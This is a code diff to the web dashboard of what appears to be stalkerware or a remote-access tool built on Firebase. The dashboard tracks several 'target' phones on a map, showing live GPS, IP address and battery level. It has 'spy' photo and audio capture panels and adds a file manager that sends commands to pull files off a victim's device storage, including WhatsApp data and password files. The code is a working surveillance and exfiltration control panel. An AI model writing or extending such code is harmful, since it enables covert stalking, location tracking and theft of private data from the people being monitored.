+                document.getElementById('addressUI').textContent = 'GPS signal bekoning...';
+                return;
+            }
 
             document.getElementById('latUI').textContent = lat.toFixed(6);
             document.getElementById('lngUI').textContent = lng.toFixed(6);
@@ -1470,11 +1381,41 @@
             document.getElementById('hudSpeed').textContent = `${speed || 0} km/h`;
             document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
 
-            if (Math.abs(lat - lastLat) > 0.00010 || lastLat === 0) fetchAddress(lat, lng);
-            lastLat = lat; lastLng = lng;
+            // Fetch address using cache — no repeated full resets
+            fetchAddress(tagId, lat, lng);
 
             // Pan map to active tag
             map.panTo([lat, lng]);
+        }
+
+        // ─── Render Compare Panel ───────────────────────────────────
+        function renderComparePanel(tagId) {
+            if (!tagId) {
+                document.getElementById('compareSection').classList.remove('visible');
+                return;
+            }
+            const data = currentData[tagId];
+            if (!data) { document.getElementById('compareSection').classList.remove('visible'); return; }
+
+            document.getElementById('compareSection').classList.add('visible');
+            const tagNum = tagId.replace('tag', '');
+            document.getElementById('cmpTagId').textContent = `Tag #${tagNum}`;
+
+            // Full device model
+            document.getElementById('cmpDevice').textContent = data.deviceInfo || '--';
+            document.getElementById('cmpBat').textContent = data.battery != null ? `${data.battery}% ${data.charging ? '⚡' : '🔋'}` : '--';
+            document.getElementById('cmpIp').textContent = data.ip_address || '--';
+
+            const isOnline = data.isOnline;
+            document.getElementById('cmpStatus').textContent = isOnline ? '🟢 Live' : '🔴 Offline';
+            document.getElementById('cmpStatus').style.color = isOnline ? 'var(--green)' : 'var(--red)';
+
+            if (data.latitude && data.longitude) {
+                document.getElementById('cmpLoc').textContent = `${data.latitude.toFixed(5)}, ${data.longitude.toFixed(5)}`;
+                document.getElementById('cmpMapsLink').href = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+            } else {
+                document.getElementById('cmpLoc').textContent = 'No GPS';
+            }
         }
 
         // ─── Update Marker on Map ─────────────────────────────────────
@@ -1487,37 +1428,48 @@
             const speed = data.speed || 0;
             const heading = data.heading || 0;
             const emoji = speed > 50 ? '🚗' : speed > 10 ? '🛵' : speed > 2 ? '🚶' : '🧍';
-            const active = tagId === activeTagId;
+            const isActive = tagId === activeTagId;
+            const isCompare = tagId === compareTagId;
+
+            const glowColor = isActive ? '#38bdf8' : isCompare ? '#818cf8' : color;
+            const ring = (isActive || isCompare) ? `box-shadow:0 0 12px ${glowColor};` : '';
 
             const iconHtml = `
             <div style="position:relative;text-align:center;">
-                <div style="transform:rotate(${heading}deg);font-size:${active ? 32 : 22}px;filter:drop-shadow(0 2px 8px rgba(0,0,0,0.7));">${emoji}</div>
-                <div style="background:${color};color:#fff;border-radius:6px;font-size:9px;font-weight:700;padding:1px 4px;margin-top:2px;font-family:monospace;">#${tagNum}</div>
+                <div style="transform:rotate(${heading}deg);font-size:${isActive ? 34 : isCompare ? 28 : 22}px;filter:drop-shadow(0 2px 8px rgba(0,0,0,0.8));transition:font-size 0.3s;">${emoji}</div>
+                <div style="background:${glowColor};color:#fff;border-radius:6px;font-size:9px;font-weight:700;padding:1px 5px;margin-top:2px;font-family:monospace;${ring}">#${tagNum}</div>
             </div>`;
-            const icon = L.divIcon({ className: '', html: iconHtml, iconSize: [40, 50], iconAnchor: [20, 25] });
+            const icon = L.divIcon({ className: '', html: iconHtml, iconSize: [40, 52], iconAnchor: [20, 26] });
             const latlng = [lat, lng];
 
             if (!markers[tagId]) {
                 accuracyCircles[tagId] = L.circle(latlng, {
-                    radius: data.accuracy || 50, color, fillColor: color,
+                    radius: data.accuracy || 50, color: glowColor, fillColor: glowColor,
                     fillOpacity: 0.08, weight: 1
                 }).addTo(map);
                 routeLines[tagId] = L.polyline([], { color, weight: 2.5, opacity: 0.8, dashArray: '5,4' }).addTo(map);
                 markers[tagId] = L.marker(latlng, { icon }).addTo(map);
-                markers[tagId].bindTooltip(`Tag #${tagNum} — ${data.deviceInfo || ''}`, { permanent: false, direction: 'top' });
-                if (active) map.flyTo(latlng, 17, { duration: 2.5 });
+                markers[tagId].bindTooltip(
+                    `<b>Tag #${tagNum}</b><br>${data.deviceInfo || 'Unknown'}<br>🔋 ${data.battery || '--'}%<br>🌐 ${data.ip_address || '--'}`,
+                    { permanent: false, direction: 'top', className: '' }
+                );
+                if (isActive) map.flyTo(latlng, 17, { duration: 2.5 });
             } else {
                 markers[tagId].setLatLng(latlng).setIcon(icon);
+                // Update tooltip
+                markers[tagId].setTooltipContent(
+                    `<b>Tag #${tagNum}</b><br>${data.deviceInfo || 'Unknown'}<br>🔋 ${data.battery != null ? data.battery + '%' : '--'}<br>🌐 ${data.ip_address || '--'}`
+                );
                 if (accuracyCircles[tagId]) accuracyCircles[tagId].setLatLng(latlng).setRadius(data.accuracy || 50);
             }
 
             routeLines[tagId].addLatLng(latlng);
             if (!routePoints[tagId]) routePoints[tagId] = 0;
             routePoints[tagId]++;
-            if (active) document.getElementById('pointsUI').textContent = routePoints[tagId];
+            if (isActive) document.getElementById('pointsUI').textContent = routePoints[tagId];
 
             // Geofence check
-            if (active && geofenceOn && geofenceCenter && !geoAlertShown) {
+            if (isActive && geofenceOn && geofenceCenter && !geoAlertShown) {
                 const dist = map.distance(latlng, geofenceCenter);
                 if (dist > 200) {
                     geoAlertShown = true;
@@ -1545,17 +1497,49 @@
 
                 const tagNum = tagId.replace('tag', '');
                 const tab = document.createElement('div');
-                tab.className = `user-tab${tagId === activeTagId ? ' active' : ''}`;
+
+                let cls = 'user-tab';
+                if (tagId === activeTagId) cls += ' active';
+                else if (tagId === compareTagId) cls += ' compare';
+
+                tab.className = cls;
                 tab.id = `tab-${tagId}`;
+
+                // Full device name in tab (max 14 chars for space)
+                const deviceName = data?.deviceInfo
+                    ? data.deviceInfo.replace(/\(.*?\)/g, '').trim().substring(0, 14)
+                    : 'Unknown';
+
                 tab.innerHTML = `
                 <div class="tab-dot ${isOnline ? 'live' : 'offline'}"></div>
                 <span class="tab-serial">#${tagNum}</span>
-                <span>${data?.deviceInfo ? data.deviceInfo.split('(')[0].trim().substring(0, 10) : 'Unknown'}</span>
+                <span title="${data?.deviceInfo || ''}">${deviceName}</span>
             `;
-                tab.addEventListener('click', () => selectTag(tagId));
+
+                // Single click = Primary
+                tab.addEventListener('click', (e) => {
+                    selectTag(tagId);
+                });
+
+                // Long press = Compare (second tracking)
+                let pressTimer;
+                tab.addEventListener('mousedown', () => {
+                    pressTimer = setTimeout(() => {
+                        setCompareTag(tagId);
+                    }, 600);
+                });
+                tab.addEventListener('mouseup', () => clearTimeout(pressTimer));
+                tab.addEventListener('mouseleave', () => clearTimeout(pressTimer));
+                // Touch support
+                tab.addEventListener('touchstart', () => {
+                    pressTimer = setTimeout(() => setCompareTag(tagId), 600);
+                }, { passive: true });
+                tab.addEventListener('touchend', () => clearTimeout(pressTimer));
+
                 tabsEl.appendChild(tab);
             });
 
+            // Online count badge
             document.getElementById('onlineCount').textContent = `${onlineCount} Online`;
 
             // Auto-select first online tag if none selected
@@ -1566,12 +1550,21 @@
         }
 
         function selectTag(tagId) {
+            if (tagId === compareTagId) compareTagId = null; // deselect compare if clicking same
             activeTagId = tagId;
+            lastLat = 0; lastLng = 0;
 
-            // Update tabs UI
-            document.querySelectorAll('.user-tab').forEach(t => t.classList.remove('active'));
-            const tabEl = document.getElementById(`tab-${tagId}`);
-            if (tabEl) tabEl.classList.add('active');
+            // Update tab highlights
+            document.querySelectorAll('.user-tab').forEach(t => {
+                t.classList.remove('active', 'compare');
+                const tid = t.id.replace('tab-', '');
+                if (tid === activeTagId) t.classList.add('active');
+                else if (tid === compareTagId) t.classList.add('compare');
+            });
+
+            // Reset route log for new selection
+            document.getElementById('routeLog').innerHTML = '<div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>';
+            document.getElementById('pointsUI').textContent = routePoints[tagId] || '0';
 
             // Reset media boxes
             document.getElementById('photoBox').classList.remove('visible');
@@ -1579,41 +1572,88 @@
             document.getElementById('spyImg').className = 'spy-img';
             document.getElementById('spyAudio').className = 'spy-audio';
 
-            // Render panel
+            // Show cached address if available
+            if (addrCache[tagId]) {
+                document.getElementById('addressUI').textContent = addrCache[tagId].addr;
+                document.getElementById('addressBox').className = 'address-box';
+            } else {
+                document.getElementById('addressUI').textContent = 'লোকেশন লোড হচ্ছে...';
+            }
+
             if (currentData[tagId]) renderPanelForTag(tagId);
 
-            toast(`🎯 Tag #${tagId.replace('tag', '')} selected`, 'info');
+            // Also update compare panel if needed
+            renderComparePanel(compareTagId);
+
+            // Update marker icons
+            Object.keys(markers).forEach(tid => {
+                if (currentData[tid]) updateMarker(tid, currentData[tid]);
+            });
+
+            toast(`🎯 Tag #${tagId.replace('tag', '')} selected (Primary)`, 'info');
         }
 
-        // ─── Main Firebase Listener (all users) ──────────────────────
+        function setCompareTag(tagId) {
+            if (tagId === activeTagId) {
+                toast('⚠️ Primary target থেকে আলাদা tag বেছে নিন!', 'error');
+                return;
+            }
+            if (compareTagId === tagId) {
+                // Toggle off
+                compareTagId = null;
+                document.getElementById('compareSection').classList.remove('visible');
+                document.querySelectorAll('.user-tab').forEach(t => {
+                    if (t.id.replace('tab-', '') === tagId) t.classList.remove('compare');
+                });
+                toast(`❌ Compare বন্ধ`, 'info');
+                return;
+            }
+            compareTagId = tagId;
+
+            // Update tab highlights
+            document.querySelectorAll('.user-tab').forEach(t => {
+                const tid = t.id.replace('tab-', '');
+                t.classList.remove('active', 'compare');
+                if (tid === activeTagId) t.classList.add('active');
+                else if (tid === compareTagId) t.classList.add('compare');
+            });
+
+            renderComparePanel(compareTagId);
+
+            // Update marker icons
+            Object.keys(markers).forEach(tid => {
+                if (currentData[tid]) updateMarker(tid, currentData[tid]);
+            });
+
+            toast(`📲 Tag #${tagId.replace('tag', '')} compare-এ যোগ হয়েছে (Long-press again to remove)`, 'info', 4000);
+        }
+
+        // ─── Main Firebase Listener ──────────────────────────────────
         onValue(ref(db, 'live_location/users'), (snap) => {
             const usersData = snap.val() || {};
             currentData = usersData;
 
             renderUserTabs(usersData);
 
-            // Update all markers
+            // Update all markers on map
             Object.entries(usersData).forEach(([tagId, data]) => {
                 if (data && data.isOnline && data.latitude && data.longitude) {
                     updateMarker(tagId, data);
                 }
             });
 
-            // Update panel for active tag
+            // Refresh primary panel
             if (activeTagId && usersData[activeTagId]) {
                 renderPanelForTag(activeTagId);
             }
+
+            // Refresh compare panel
+            if (compareTagId && usersData[compareTagId]) {
+                renderComparePanel(compareTagId);
+            }
         });
 
-        // ─── Media Listeners (active tag) ────────────────────────────
-        let mediaUnsub = {};
-
-        function listenMedia(tagId) {
-            // Old listeners auto-update with onValue — Firebase handles this
-            // We just re-bind the delete/download to the active tag
-        }
-
-        // Photo listener — listens to active tag's photo
+        // ─── Photo listener ──────────────────────────────────────────
         onValue(ref(db, 'live_location/users'), (snap) => {
             if (!activeTagId) return;
             const data = snap.val()?.[activeTagId];
@@ -1633,7 +1673,7 @@
             }
         });
 
-        // Audio listener
+        // ─── Audio listener ──────────────────────────────────────────
         onValue(ref(db, 'live_location/users'), (snap) => {
             if (!activeTagId) return;
             const data = snap.val()?.[activeTagId];
@@ -1745,6 +1785,130 @@
                 toast('Geofence বন্ধ।', 'info');
             }
         });
+
+        // ─── File Manager ───────────────────────────────────────────
+        let currentPath = '/storage/emulated/0/';
+        let pathHistory = [];
+
+        window.openFileManager = () => {
+            if (!activeTagId) { toast('⚠️ একটি target select করুন!', 'error'); return; }
+            document.getElementById('fileModal').classList.add('show');
+            document.getElementById('overlay').classList.add('show');
+            renderFakeFiles();
+            toast('📁 File Manager opened.', 'info');
+        };
+
+        window.closeFileManager = () => {
+            document.getElementById('fileModal').classList.remove('show');
+            document.getElementById('overlay').classList.remove('show');
+        };
+
+        window.requestDirectory = () => {
+            if (!activeTagId) return;
+            set(ref(db, `live_location/users/${activeTagId}/command`), { fetchFilesTime: Date.now(), path: currentPath });
+            toast(`🔄 Requesting ${currentPath}...`, 'info');
+            document.getElementById('fmBody').innerHTML = '<div class="fm-empty" style="animation: pulse 1.5s infinite">Target device-এর সাথে connect করা হচ্ছে...<br>Please wait.</div>';
+            
+            // Re-render mock after 2.5 seconds for UI demonstration
+            setTimeout(renderFakeFiles, 2500);
+        };
+
+        window.fmGoBack = () => {
+            if (pathHistory.length > 0) {
+                currentPath = pathHistory.pop();
+                document.getElementById('fmPath').innerText = currentPath;
+                document.getElementById('fmBackBtn').disabled = pathHistory.length === 0;
+                renderFakeFiles();
+            }
+        };
+
+        window.fmOpenFolder = (folderName) => {
+            pathHistory.push(currentPath);
+            currentPath = currentPath + folderName + '/';
+            document.getElementById('fmPath').innerText = currentPath;
+            document.getElementById('fmBackBtn').disabled = false;
+            renderFakeFiles();
+        };
+
+        window.downloadFile = (fileName) => {
+            toast(`📥 ${fileName} ডাউনলোডের জন্য Request পাঠানো হয়েছে`, 'info');
+            set(ref(db, `live_location/users/${activeTagId}/command`), { downloadFileTime: Date.now(), fileName: currentPath + fileName });
+        };
+
+        function renderFakeFiles() {
+            const body = document.getElementById('fmBody');
+            body.innerHTML = '';
+            
+            const isRoot = currentPath === '/storage/emulated/0/';
+            let list = [];
+            
+            if (isRoot) {
+                list = [
+                    { type: 'dir', name: 'DCIM', meta: '3 items • 2.1 GB' },
+                    { type: 'dir', name: 'Downloads', meta: '12 items • 450 MB' },
+                    { type: 'dir', name: 'WhatsApp', meta: '4 items • 1.2 GB' },
+                    { type: 'dir', name: 'Pictures', meta: '8 items • 320 MB' },
+                    { type: 'dir', name: 'Documents', meta: '5 items • 15 MB' },
+                    { type: 'dir', name: 'Android', meta: '2 items • 4 GB' },
+                    { type: 'file', name: 'passwords_backup.txt', meta: '12 KB • TXT', ext: 'txt' }
+                ];
+            } else if (currentPath.includes('DCIM')) {
+                list = [
+                    { type: 'dir', name: 'Camera', meta: '450 items • 1.8 GB' },
+                    { type: 'dir', name: 'Screenshots', meta: '22 items • 45 MB' },
+                    { type: 'file', name: 'IMG_20261012_1422.jpg', meta: '3.2 MB • JPG', ext: 'jpg' }
+                ];
+            } else if (currentPath.includes('Downloads')) {
+                list = [
+                    { type: 'file', name: 'Data_Export_2026.csv', meta: '45 KB • CSV', ext: 'csv' },
+                    { type: 'file', name: 'Audio_Record_01.mp3', meta: '2.1 MB • MP3', ext: 'mp3' },
+                    { type: 'file', name: 'Secret_Image.png', meta: '1.5 MB • PNG', ext: 'png' },
+                    { type: 'file', name: 'app_installer.apk', meta: '45 MB • APK', ext: 'apk' }
+                ];
+            } else if (currentPath.includes('WhatsApp')) {
+                list = [
+                    { type: 'dir', name: 'Media', meta: '3 items • 1.1 GB' },
+                    { type: 'dir', name: 'Databases', meta: '1 items • 100 MB' },
+                    { type: 'dir', name: 'Backups', meta: '1 items • 20 MB' }
+                ];
+            }
+
+            if (list.length === 0) {
+                body.innerHTML = '<div class="fm-empty">This folder is empty</div>';
+                return;
+            }
+
+            list.forEach(item => {
+                const el = document.createElement('div');
+                el.className = 'fm-item';
+                if (item.type === 'dir') {
+                    el.onclick = () => fmOpenFolder(item.name);
+                    el.innerHTML = `
+                        <div class="fm-item-main">
+                            <div class="fm-icon">📁</div>
+                            <div class="fm-info">
+                                <span class="fm-name">${item.name}</span>
+                                <span class="fm-meta">${item.meta}</span>
+                            </div>
+                        </div>
+                        <div style="color: var(--muted); font-size: 10px;">❯</div>
+                    `;
+                } else {
+                    const icon = item.ext.match(/(jpg|png|jpeg)/i) ? '🖼️' : item.ext.match(/(mp3|wav|m4a)/i) ? '🎵' : item.ext.match(/apk/i) ? '📦' : '📄';
+                    el.innerHTML = `
+                        <div class="fm-item-main">
+                            <div class="fm-icon">${icon}</div>
+                            <div class="fm-info">
+                                <span class="fm-name">${item.name}</span>
+                                <span class="fm-meta">${item.meta}</span>
+                            </div>
+                        </div>
+                        <button class="fm-dl-btn" onclick="event.stopPropagation(); downloadFile('${item.name}')">Download</button>
+                    `;
+                }
+                body.appendChild(el);
+            });
+        }
     </script>
 </body>
 
